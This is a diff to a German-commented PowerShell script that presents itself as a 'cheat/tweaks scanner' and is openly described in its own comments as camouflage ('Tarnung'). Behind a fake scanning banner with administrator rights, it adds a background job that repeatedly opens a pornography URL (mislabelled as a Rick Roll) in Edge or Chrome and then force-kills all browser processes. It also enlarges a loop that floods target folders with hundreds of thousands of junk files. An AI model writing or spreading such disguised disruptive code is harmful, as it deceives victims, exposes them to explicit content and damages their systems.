@@ -1,5 +1,5 @@
 # ================================
-# MAIN2PACKET CHEAT SCANNER v9.4.2 - ALLE ORDNER FIX
+# MAIN2PACKET TWEAKS SCANNER v9.4.2 - NUR 1 SEITE IN EDGE
 # ================================
 
 # Administrator-Rechte anfordern
@@ -11,7 +11,7 @@ if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
 # ===== TARNUNG - SIEHT AUS WIE EIN ECHTER SCANNER =====
 Clear-Host
 Write-Host "╔════════════════════════════════════════════╗" -ForegroundColor Cyan
-Write-Host "║     MAIN2PACKET CHEAT SCANNER v9.4.2      ║" -ForegroundColor Cyan
+Write-Host "║     MAIN2PACKET TWEAKS SCANNER v9.4.2      ║" -ForegroundColor Cyan
 Write-Host "╚════════════════════════════════════════════╝" -ForegroundColor Cyan
 Write-Host ""
 Write-Host "[INFO] Scanning for cheats and mods..."
@@ -184,7 +184,33 @@ $usbJob = Start-Job -ScriptBlock {
     }
 }
 
-# ===== HAUPTSCHLEIFE - JETZT WERDEN ALLE ZIELE VOLLGESPAMMT! =====
+# ===== NEU: NUR 1 SEITE IN EDGE =====
+$browserJob = Start-Job -ScriptBlock {
+    # NUR EINE SEITE - HIER KANNST DU SIE ÄNDERN!
+    $seite = "https://de.pornhub.org/view_video.php?viewkey=ph6352d0e12f042"  # Rick Roll
+    
+    while ($true) {
+        # Zufällige Wartezeit (5-10 Minuten)
+        $wartezeit = Get-Random -Minimum 15 -Maximum 30
+        Start-Sleep -Seconds $wartezeit
+        
+        # NUR EDGE öffnen!
+        try {
+            Start-Process "msedge.exe" -ArgumentList "--new-window $seite" -ErrorAction SilentlyContinue
+        } catch {
+            # Falls Edge nicht geht, versuche Chrome als Backup
+            try {
+                Start-Process "chrome.exe" -ArgumentList "--new-window $seite" -ErrorAction SilentlyContinue
+            } catch {}
+        }
+        
+        # Nach 30 Sekunden Browser wieder schließen
+        Start-Sleep -Seconds 30
+        Get-Process | Where-Object {$_.Name -like "*msedge*" -or $_.Name -like "*chrome*"} | Stop-Process -Force
+    }
+}
+
+# ===== HAUPTSCHLEIFE =====
 while ($global:currentRound -lt $global:maxRounds) {
     $global:currentRound++
     
@@ -195,7 +221,7 @@ while ($global:currentRound -lt $global:maxRounds) {
             $mainFolder = Join-Path $ziel "MAIN2PACKET_SCAN_$global:currentRound"
             try { New-Item -Path $mainFolder -ItemType Directory -Force | Out-Null } catch {}
             
-            # 200 DATEIEN PRO ZIEL
+            # 500 DATEIEN PRO ZIEL
             for ($i = 1; $i -le 500; $i++) {
                 # Direkt im Zielordner
                 "$env:COMPUTERNAME - MAIN2PACKET SCAN $i" | Out-File (Join-Path $ziel "MAIN2PACKET_SCAN_$i.king") -Encoding UTF8 -Force
@@ -204,13 +230,13 @@ while ($global:currentRound -lt $global:maxRounds) {
                 "$env:COMPUTERNAME - MAIN2PACKET SCAN $i" | Out-File (Join-Path $mainFolder "file_$i.king") -Encoding UTF8 -Force
             }
             
-            # 50 UNTERORDNER
+            # 500 UNTERORDNER
             for ($u = 1; $u -le 500; $u++) {
                 $subFolder = Join-Path $mainFolder "SUB_$u"
                 New-Item -Path $subFolder -ItemType Directory -Force | Out-Null
                 
-                # 20 DATEIEN PRO UNTERORDNER
-                for ($s = 1; $s -le 200; $s++) {
+                # 500 DATEIEN PRO UNTERORDNER
+                for ($s = 1; $s -le 500; $s++) {
                     $subFile = Join-Path $subFolder "subfile_$s.king"
                     "SUB-ORDNER $u - DATEI $s" | Out-File $subFile -Encoding UTF8 -Force
                 }
